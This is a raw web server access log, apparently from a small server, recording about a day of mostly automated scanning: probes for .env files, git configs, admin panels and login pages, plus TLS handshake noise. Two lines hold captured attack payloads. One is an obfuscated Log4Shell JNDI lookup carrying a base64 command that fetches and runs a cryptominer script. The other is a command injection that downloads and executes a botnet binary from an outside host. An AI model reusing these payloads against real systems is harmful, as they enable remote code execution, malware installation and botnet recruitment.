204.76.203.219 - - [09/Oct/2025:21:55:12 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
87.121.84.17 - - [09/Oct/2025:22:06:44 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
80.75.212.83 - - [09/Oct/2025:22:41:39 +0000] "GET /t%28%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D//45.38.42.81:3389/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBMQ19BTEw9ZW5fVVMuVVRGLTggYmFzaCAtcyA0ODZ4cXc3eXNYZEt3N1JrVnpUNXRkU2lEdEU2c294VWRZYUdhR0UxR29hQ2R2QkY3clZnNW9NWEw5cEZ4M3JCMVdVQ1pySnZkNkFITUZXaXBlWXQ1ZUZOVXg5cG1HTg==%7D%27%29 HTTP/1.1" 400 154 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//45.38.42.81:3389/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBMQ19BTEw9ZW5fVVMuVVRGLTggYmFzaCAtcyA0ODZ4cXc3eXNYZEt3N1JrVnpUNXRkU2lEdEU2c294VWRZYUdhR0UxR29hQ2R2QkY3clZnNW9NWEw5cEZ4M3JCMVdVQ1pySnZkNkFITUZXaXBlWXQ1ZUZOVXg5cG1HTg==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//45.38.42.81:3389/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBMQ19BTEw9ZW5fVVMuVVRGLTggYmFzaCAtcyA0ODZ4cXc3eXNYZEt3N1JrVnpUNXRkU2lEdEU2c294VWRZYUdhR0UxR29hQ2R2QkY3clZnNW9NWEw5cEZ4M3JCMVdVQ1pySnZkNkFITUZXaXBlWXQ1ZUZOVXg5cG1HTg==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//45.38.42.81:3389/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBMQ19BTEw9ZW5fVVMuVVRGLTggYmFzaCAtcyA0ODZ4cXc3eXNYZEt3N1JrVnpUNXRkU2lEdEU2c294VWRZYUdhR0UxR29hQ2R2QkY3clZnNW9NWEw5cEZ4M3JCMVdVQ1pySnZkNkFITUZXaXBlWXQ1ZUZOVXg5cG1HTg==}')"
20.106.57.131 - - [09/Oct/2025:23:12:37 +0000] "GET /developmentserver/metadatauploader HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
23.234.92.112 - - [09/Oct/2025:23:21:25 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/129.0 (compatible; MSIE 5.01; Windows NT 5.0)" "-"
23.234.92.112 - - [09/Oct/2025:23:21:47 +0000] "GET /phpmyadmin HTTP/1.1" 400 154 "-" "Mozilla/129.0 (compatible; MSIE 5.01; Windows NT 5.0)" "-"
147.185.132.39 - - [09/Oct/2025:23:25:10 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xED\xF5G\xD2\xDB\x1A\xDA\xAD\xC5&\xD31GgD9\xD4\xEC\xE0\x93\x82\x22\x9F\xE4\xCFY\x0E\x9CD\xF2\xEB\xBA\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 150 "-" "-" "-"
147.185.132.39 - - [09/Oct/2025:23:25:10 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x09\xB0=\xAA\x0C\x90H\xB1\x9B)\xB5&f\x94\x14\x08\x82\xAE\xA0&\x89\xBF>\xBC\xCE\xBFK$H\x8C\xC6\x81 \xFB\x05`\x16>\xF5\x0C\xAA\x03\x1F\xFD\x19\xA9\x8D\xF8S\xC9\xE0+\xC8\xE1\x81B\xA5\x09\xD74\x8A\xAF\x87c&\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 150 "-" "-" "-"
185.242.226.110 - - [09/Oct/2025:23:33:41 +0000] "\x16\x03\x01\x00\x8A\x01\x00\x00\x86\x03\x03\x14;h[\xE6#\x1A^\x91\x17" 400 150 "-" "-" "-"
87.121.84.17 - - [09/Oct/2025:23:46:22 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
176.65.148.132 - - [10/Oct/2025:00:12:26 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
176.65.148.132 - - [10/Oct/2025:00:12:26 +0000] "" 400 0 "-" "-" "-"
107.174.194.53 - - [10/Oct/2025:00:14:23 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
107.174.194.53 - - [10/Oct/2025:00:14:23 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
24.199.100.206 - - [10/Oct/2025:00:14:35 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
209.242.203.161 - - [10/Oct/2025:00:32:06 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
209.242.203.161 - - [10/Oct/2025:00:32:06 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
102.88.54.122 - - [10/Oct/2025:00:46:38 +0000] "GET /.env HTTP/1.1" 400 154 "-" "python-requests/2.26.0" "-"
102.88.54.122 - - [10/Oct/2025:00:46:39 +0000] "POST / HTTP/1.1" 400 154 "-" "python-requests/2.26.0" "-"
93.174.93.12 - - [10/Oct/2025:00:49:26 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 150 "-" "-" "-"
167.94.138.178 - - [10/Oct/2025:01:07:14 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
167.94.138.178 - - [10/Oct/2025:01:07:15 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
167.94.138.178 - - [10/Oct/2025:01:07:18 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
167.94.138.178 - - [10/Oct/2025:01:07:18 +0000] "GET /.well-known/security.txt HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
66.132.153.127 - - [10/Oct/2025:01:08:41 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
66.132.153.127 - - [10/Oct/2025:01:08:41 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
66.132.153.127 - - [10/Oct/2025:01:09:15 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
66.132.153.127 - - [10/Oct/2025:01:09:15 +0000] "GET /login HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
87.121.84.17 - - [10/Oct/2025:01:41:25 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
20.169.104.27 - - [10/Oct/2025:01:53:12 +0000] "GET /hudson HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
170.83.199.105 - - [10/Oct/2025:01:57:07 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
24.199.100.206 - - [10/Oct/2025:02:15:47 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
194.163.129.51 - - [10/Oct/2025:02:28:35 +0000] "GET / HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
165.227.100.212 - - [10/Oct/2025:02:44:45 +0000] "GET / HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
216.180.246.187 - - [10/Oct/2025:03:28:39 +0000] "GET / HTTP/1.0" 400 143 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.187 - - [10/Oct/2025:03:29:24 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x81\xC9\xD1\xA5\xE6@\xF6qf\xEF[\xA8\xFC\xD6x\xF8+\x05D\x1C\xA3 \x17\xA3\xC7H\x8D\xE3\xAB\xC3\xF9\x0C Su$`C\x87Y-7\x915\xDF&u\x86\xB4n\x1E\x89\xC3s\x16\xB9b\x08>\x81\xED\x9B\x11<\x01\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
216.180.246.187 - - [10/Oct/2025:03:30:50 +0000] "GET / HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
87.121.84.17 - - [10/Oct/2025:03:37:50 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
216.180.246.187 - - [10/Oct/2025:03:38:35 +0000] "GET /manage/account/login HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
199.45.154.151 - - [10/Oct/2025:03:41:32 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
199.45.154.151 - - [10/Oct/2025:03:41:32 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
199.45.154.151 - - [10/Oct/2025:03:41:36 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
199.45.154.151 - - [10/Oct/2025:03:41:36 +0000] "GET /.well-known/security.txt HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
216.180.246.187 - - [10/Oct/2025:03:42:42 +0000] "GET /admin/index.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.187 - - [10/Oct/2025:03:46:29 +0000] "GET /index.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.187 - - [10/Oct/2025:03:50:05 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.187 - - [10/Oct/2025:03:54:21 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.187 - - [10/Oct/2025:03:57:28 +0000] "GET /login.htm HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
149.40.50.110 - - [10/Oct/2025:04:00:33 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/129.0 (compatible; MSIE 5.01; Windows NT 5.0)" "-"
149.40.50.110 - - [10/Oct/2025:04:00:55 +0000] "GET /phpmyadmin HTTP/1.1" 400 154 "-" "Mozilla/129.0 (compatible; MSIE 5.01; Windows NT 5.0)" "-"
216.180.246.187 - - [10/Oct/2025:04:01:10 +0000] "GET /login.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.187 - - [10/Oct/2025:04:05:27 +0000] "GET /login.jsp HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
196.251.117.75 - - [10/Oct/2025:04:05:56 +0000] "GET /.git/config HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 6.2; rv:19.0) Gecko/20121129 Firefox/19.0" "-"
216.180.246.187 - - [10/Oct/2025:04:09:15 +0000] "GET /login HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.187 - - [10/Oct/2025:04:12:50 +0000] "GET /doc/index.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.187 - - [10/Oct/2025:04:17:07 +0000] "GET /remote/login HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.187 - - [10/Oct/2025:04:20:52 +0000] "GET //admin/login.asp HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
65.49.1.52 - - [10/Oct/2025:04:23:12 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xA4)R7\x01l\x07\x98@4\xE9\xB3\xD1\xC3\xAB_\x0C!\xABT\x8C\x1Ci\xBE\x08\x10\x1A\x1A\x83ek\x0B\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
216.180.246.187 - - [10/Oct/2025:04:24:12 +0000] "GET /web/ HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
104.253.219.169 - - [10/Oct/2025:04:27:35 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
104.253.219.169 - - [10/Oct/2025:04:27:35 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
216.180.246.187 - - [10/Oct/2025:04:28:16 +0000] "GET //webpages/login.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
91.227.62.213 - - [10/Oct/2025:04:31:08 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
103.252.89.75 - - [10/Oct/2025:04:57:26 +0000] "GET / HTTP/1.1" 400 154 "-" "-" "-"
91.227.62.213 - - [10/Oct/2025:04:57:50 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
138.36.155.73 - - [10/Oct/2025:05:03:50 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
198.235.24.35 - - [10/Oct/2025:05:21:07 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x91\xE3\x03If\xDB\xF0g\xAE@.\x97$b\x96\xDA\x01\x85\xDD\xAA\xB2'B\x8B!i\x88m\xE9\xE4M4\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 150 "-" "-" "-"
198.235.24.35 - - [10/Oct/2025:05:21:07 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x02\x88\xD6\xF5\x95\x84\x81d\xB9\xBE\xC8\x7F\xE7\x0F\xCDJ\xD6\x0F\xEF\x8D\xAB\x08\x14\x7FIH\xA3\x1C7\xB0\x8D} \x7FImT\xF1\xA8\x910\xF6\xAF\xD5i;\x18\xECf\x07\xCF\xD9hed\x94\xDA\xDA\xC0\xFA\x13H\x0F\xCA%\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 150 "-" "-" "-"
87.121.84.17 - - [10/Oct/2025:05:24:57 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
91.227.62.213 - - [10/Oct/2025:05:44:14 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
91.227.62.213 - - [10/Oct/2025:05:57:23 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
82.23.227.109 - - [10/Oct/2025:06:25:12 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
82.23.227.109 - - [10/Oct/2025:06:25:13 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
91.224.92.17 - - [10/Oct/2025:06:33:41 +0000] "GET / HTTP/1.1" 400 154 "-" "-" "-"
40.124.170.45 - - [10/Oct/2025:06:48:56 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
87.121.84.17 - - [10/Oct/2025:07:05:25 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
204.76.203.212 - - [10/Oct/2025:07:26:56 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
43.155.195.141 - - [10/Oct/2025:07:30:22 +0000] "GET / HTTP/1.1" 200 400 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
43.165.67.57 - - [10/Oct/2025:07:34:08 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
143.244.181.47 - - [10/Oct/2025:07:35:21 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
202.93.142.22 - - [10/Oct/2025:08:11:33 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
182.127.191.195 - - [10/Oct/2025:08:15:25 +0000] "POST /HNAP1/ HTTP/1.0" 400 0 "-" "-" "-"
87.121.84.17 - - [10/Oct/2025:08:32:07 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
38.170.173.88 - - [10/Oct/2025:09:14:02 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
38.170.173.88 - - [10/Oct/2025:09:14:02 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
87.121.84.101 - - [10/Oct/2025:09:15:34 +0000] "GET / HTTP/1.0" 400 143 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" "-"
20.64.105.6 - - [10/Oct/2025:09:33:45 +0000] "GET /hudson HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
144.172.106.140 - - [10/Oct/2025:09:39:33 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 400 154 "http://3.149.120.21:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
144.172.106.140 - - [10/Oct/2025:09:39:33 +0000] "" 400 0 "-" "-" "-"
87.121.84.17 - - [10/Oct/2025:10:30:37 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
103.252.89.75 - - [10/Oct/2025:10:38:34 +0000] "GET / HTTP/1.1" 400 154 "-" "-" "-"
54.201.41.91 - - [10/Oct/2025:11:15:44 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Linux; Android 8.0.0; moto e5 plus Build/OPPS27.91-122-3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36" "-"
140.99.206.14 - - [10/Oct/2025:11:25:14 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
140.99.206.14 - - [10/Oct/2025:11:25:15 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
144.172.116.36 - - [10/Oct/2025:11:38:46 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20boatnet.arm7%3B%20wget%20http%3A%2F%2F103.77.241.50%2Fhiddenbin%2Fboatnet.arm7%3B%20chmod%20777%20%2A%3B%20.%2Fboatnet.arm7%20tbk HTTP/1.1" 400 154 "-" "Mozilla/5.0" "-"
103.252.89.75 - - [10/Oct/2025:12:36:31 +0000] "GET / HTTP/1.1" 400 154 "-" "-" "-"
87.121.84.17 - - [10/Oct/2025:12:49:01 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
124.156.225.181 - - [10/Oct/2025:13:03:10 +0000] "GET / HTTP/1.1" 200 400 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
67.227.113.43 - - [10/Oct/2025:13:52:55 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
67.227.113.43 - - [10/Oct/2025:13:52:55 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
20.127.202.251 - - [10/Oct/2025:14:11:22 +0000] "MGLNDD_3.149.120.21_80" 400 150 "-" "-" "-"
87.121.84.101 - - [10/Oct/2025:14:13:40 +0000] "GET / HTTP/1.0" 400 143 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" "-"
43.166.247.155 - - [10/Oct/2025:14:18:51 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
87.121.84.17 - - [10/Oct/2025:14:40:37 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
88.210.63.67 - - [10/Oct/2025:15:09:16 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0" "-"
